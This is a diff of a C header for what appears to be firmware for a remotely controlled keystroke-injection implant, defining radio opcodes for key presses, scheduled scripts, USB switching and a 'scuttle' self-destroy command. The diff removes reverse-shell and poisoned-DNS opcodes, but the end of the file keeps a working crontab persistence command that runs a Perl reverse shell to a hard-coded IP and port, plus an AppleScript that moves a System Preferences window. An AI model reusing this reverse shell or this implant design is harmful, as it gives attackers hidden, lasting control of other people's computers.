@@ -24,8 +24,9 @@
 #define LEK_NUMBER_OF_EVENT_CALLBACKS	4
 /* With the console buffer set at this length, we could stuff the maximum length of a line x2.
 But, we could not stuff an entire script (4096), as that would be fairly ridiculous to pull off
-in a single command... */
+in a single command anyway... */
 #define LEK_MAX_CONSOLE_BUFFER			512
+#define LEK_MAX_BEACONS_NEARBY			4
 
 /* Ducky script root list! */
 
@@ -87,21 +88,36 @@ receive - wait for a packet and display it
 clear - clear all buffers
 set - set parameter value
 get - get parameter value
+radio - start/stop the radio
+sleep - allow the system to sleep for a uint32_t value of milliseconds
+pin - write/read to an I/O location
+pinmode - set the mode of an I/O location
+save - write all set parameters in RAM to EEPROM/Flash
+write - write to an address in EEPROM/Flash
+read - read an address in EEPROM/Flash
 help - display this list
 reset - soft-reset system
+version - spit out the firmware version
+interactive - enter interactive typing mode with a particular node
 */
 
-#define kCONSOLE_SEND 		"send"
-#define kCONSOLE_SCAN 		"scan"
-#define kCONSOLE_BEACON 	"beacon"
-#define kCONSOLE_PAIR 		"pair"
-#define kCONSOLE_RECEIVE 	"receive"
-#define kCONSOLE_CLEAR		"clear"
-#define kCONSOLE_SET		"set"
-#define kCONSOLE_GET		"get"
-#define kCONSOLE_SAVE		"save"
-#define KCONSOLE_HELP		"help"
-#define kCONSOLE_RESET		"reset"
+#define kCONSOLE_SEND 			"send"
+#define kCONSOLE_SCAN 			"scan"
+#define kCONSOLE_BEACON 		"beacon"
+#define kCONSOLE_PAIR 			"pair"
+#define kCONSOLE_RECEIVE 		"receive"
+#define kCONSOLE_CLEAR			"clear"
+#define kCONSOLE_SET			"set"
+#define kCONSOLE_GET			"get"
+#define kCONSOLE_RADIO			"radio"
+#define kCONSOLE_SLEEP			"sleep"
+#define kCONSOLE_PIN			"pin"
+#define kCONSOLE_PINMODE		"pinmode"
+#define kCONSOLE_SAVE			"save"
+#define KCONSOLE_HELP			"help"
+#define kCONSOLE_RESET			"reset"
+#define kCONSOLE_VERSION		"version"
+#define kCONSOLE_INTERACTIVE	"interactive"
 
 /*
   Scripts
@@ -115,6 +131,9 @@ reset - soft-reset system
   When permanent script commits happen, the scripts are rebuilt into RAM.
   When a script map is read, a ScriptMap structure is created. This contains
   the information that is neccecary to rebuild the structure of the script in RAM.
+  The first byte in a line is the control code which refers to the command itself. The rest of the line
+  is any accompanying data with that control command. It is possible to have a line that is one byte long 
+  (just the control code). 
 */
 
 #define LEK_MAX_SCRIPT_SIZE		  		4096
@@ -243,105 +262,101 @@ reset - soft-reset system
 /* Send Beacon out from the Gateway */
 // Unencrypted - Format: [1ub] Node Name Length [n-20ub] Node Name [1ub] Network Address [4ub] Uptime Ticks [1b] Software Version
 // Responds with ACK/NACK
-#define LEK_GATEWAY_BEACON              0x11
+#define LEK_GATEWAY_BEACON              			 0x11
 
 //Command Receiver to Key Press
 // Encrypted - Format: [1ub] ASCII Keycode To Press
 // Responds with ACK/NACK
-#define LEK_RECEIVER_KEY_PRESS            0x12
+#define LEK_RECEIVER_KEY_PRESS            		 	 0x12
 
 //Command Receiver to Modifier Press
 // Encrypted - Format: [1ub] Modifier [1ub] ASCII Keycode To Press 
 // Responds with ACK/NACK
-#define LEK_RECEIVER_MODIFIER_PRESS         0x13
+#define LEK_RECEIVER_MODIFIER_PRESS         		 0x13
 
 //Command Receiver to type a line
 // Encrypted - Format: [1b] (BOOLEAN) Terminate with CR/LF [1ub] Payload Size [nb] Payload
-#define LEK_RECEIVER_PRESS_LINE            0x14
+#define LEK_RECEIVER_LINE_PRESS            			 0x14
 
 //Command Receiver to send the mouse to a location relative to current position
 //Encrypted - Format: [2sb] X Positions To Move [2sb] Y Positions To Move [2sb] Scroll Wheel Positions To Move
-#define LEK_RECEIVER_MOUSE_MOVE           0x15
+#define LEK_RECEIVER_MOUSE_MOVE           			 0x15
 
 //Command Receiver to set it's internal RTC
 // Encrypted - Format: [4b] Epoch Time To Set
 // Responds with ACK/NACK
-#define LEK_RECEIVER_SET_TIME           0x16
+#define LEK_RECEIVER_SET_TIME           			 0x16
 
 //Command Receiver to pack a line
 // Encrypted - Format: [1b] Base ID [1b] Storage Index [1b] Script Index [1b] Mode [1b] Payload Size [nb] Payload
-#define LEK_RECEIVER_PACK_LINE          0x18
+#define LEK_RECEIVER_PACK_LINE          			 0x17
 
 //Command Receiver to pack a script
 // Encrypted - Format: [1b] Base ID [1b] Storage Index [1b] Storage Location [1b] Script Index [1b] Mode [1b] Payload Size [nb] Payload
-#define LEK_RECEIVER_PACK_SCRIPT          0x18
+#define LEK_RECEIVER_PACK_SCRIPT          			 0x18
 
 //Command Receiver to schedule a packed script
 // Encrypted - Format: [1b] Base ID [1b] Storage Index [1b] Storage Location [1b] Immediate/Scheduled/After Ticks [4b] Epoch Time To Execute/Execute After Ticks
 // Responds with ACK/NACK
-#define LEK_RECEIVER_SCHEDULE_SCRIPT        0x19
+#define LEK_RECEIVER_SCHEDULE_SCRIPT        		 0x19
 
 //Command Receiver to request a status packet from the receiver addressed
 // Encrypted - Format: [1b] 0x01 (Reserved)
 // Responds with Status Response (if available)
-#define LEK_RECEIVER_STATUS_REQUEST         0x1A
+#define LEK_RECEIVER_STATUS_REQUEST         		 0x1A
 
 //Command Receiver to setup an event trigger
 // Encrypted - Format: [1b] Storage Index [1b] Event Trigger [1b] Activate Immediately/Activate After Ticks/Activate At Time [4b] Epoch Time To Activate 
 // Responds with ACK/NACK
-#define LEK_RECEIVER_SET_EVENT_TRIGGER        0x1B
+#define LEK_RECEIVER_SET_EVENT_TRIGGER        		 0x1B
 
 //Command Receiver to clear all loaded scripts, lines and time
 // Encrypted - Format: [1b] 0x01 (Reserved)
 // Responds with ACK/NACK
-#define LEK_RECEIVER_CLEAR_LOADS          0x1E
+#define LEK_RECEIVER_CLEAR_LOADS          			 0x1C
 
 //Command Receiver to reboot (but not destroy)
 // Encrypted - Format: [1b] 0x01 (Reserved)
 // Responds with ACK/NACK
-#define LEK_RECEIVER_RESET              0x1C
+#define LEK_RECEIVER_RESET              			 0x1D
 
 //Command receiver to reboot and destroy
 // Encrypted - Format: [1b] 0x01 (Reserved)
 // Responds with ACK/NACK
-#define LEK_RECEIVER_SCUTTLE            0x1D
+#define LEK_RECEIVER_SCUTTLE            			 0x1E
 
 //Command Receiver to send it's schedule
 // Encrypted - Format: [1b] 0x01 (Reserved)
 // Responds with Schedule
-#define LEK_RECEIVER_SCHEDULE_REQUEST       0x1F
+#define LEK_RECEIVER_SCHEDULE_REQUEST       		 0x1F
 
-//Command Receiver to send to execute the OS X reverse-shell
-// Encrypted - Format: [1b] 0x01 (Reserved)
+//Command Receiver to send to execute a static interally baked routine
+// Encrypted - Format: [1b] Routine Index To Execute
 // Responds with ACK/NACK
-#define LEK_RECEIVER_EXECUTE_OS_X_REVSHELL    0x20
+#define LEK_RECEIVER_EXECUTE_BAKED_ROUTINE			 0x20
 
-//Command Receiver to send to execute the Windows reverse-shell
-// Encrypted - Format: [1b] 0x01 (Reserved)
-// Responds with ACK/NACK
-#define LEK_RECEIVER_EXECUTE_WINDOWS_REVSHELL  0x21
+/* Requests an ACK from the gateway, this operation is a nop */
+// Encrypted - Format: [1b] Reserved
+#define LEK_RECEIVER_NOP							 0x21
 
-/* Sets the poisoned DNS IP for the USBDriveBy */
-// Encrypted - Format: [1b] IP Octet 1 [1b] IP Octet 2 [1b] IP Octet 3 [1b] IP Octet 4
-#define LEK_RECEIVER_SET_DRIVEBY_REVSHELL_DNS_IP     0x23
-
-/* Sets the shellback IP for the USBDriveBy */
-// Encrypted - Format: [1b] IP Octet 1 [1b] IP Octet 2 [1b] IP Octet 3 [1b] IP Octet 4 [2b] Port Number
-#define LEK_RECEIVER_SET_DRIVEBY_SHELL_IP   0x24
-
-/* Commands for the USB Passthrough */
 //Command receiver to do something to the USB MUX
 // Encrypted - Format: [1ub] MUX Device
-#define LEK_RECEIVER_USB_MUX_CTL         0x35
-#define LEK_MUX_MASTER  1
-#define LEK_MUX_SLAVE   2
+#define LEK_RECEIVER_USB_MUX_CTL         0x30
+enum UsbMuxState
+{
+    kMUX_MASTER = 1,
+    kMUX_SLAVE =  2 
+};
 
 //Command receiver to do something with the slave's USB power
 // Encrypted - Format: [1ub] Action
-#define LEK_RECEIVER_USB_SLAVE_POWER_CTL     0x33
-#define LEK_USB_POWER_OFF   1
-#define LEK_USB_POWER_RESET 2
-#define LEK_USB_POWER_ON    3
+#define LEK_RECEIVER_USB_SLAVE_POWER_CTL     0x31
+enum UsbPowerState 
+{
+	kUSB_POWER_OFF = 	1,
+	kUSB_POWER_RESET = 	2,
+	kUSB_POWER_ON  =  	3
+};
 
 #define SHELLBACK_CRONJOB "(crontab -l ; echo \"*/5 * * * * perl -MIO::Socket -e'\\$c=new IO::Socket::INET(\\\"72.14.179.47:1337\\\");print\\$c \\`\\$_\\`while<\\$c>'\")  | crontab -"
 #define APPLESCRIPT_MOVE_SYSTEM_PREFERENCES "osascript -e 'tell application \"System Events\" to set bounds of window \"System Preferences\" of application \"System Preferences\" to {0, 0, 700, 700}'"
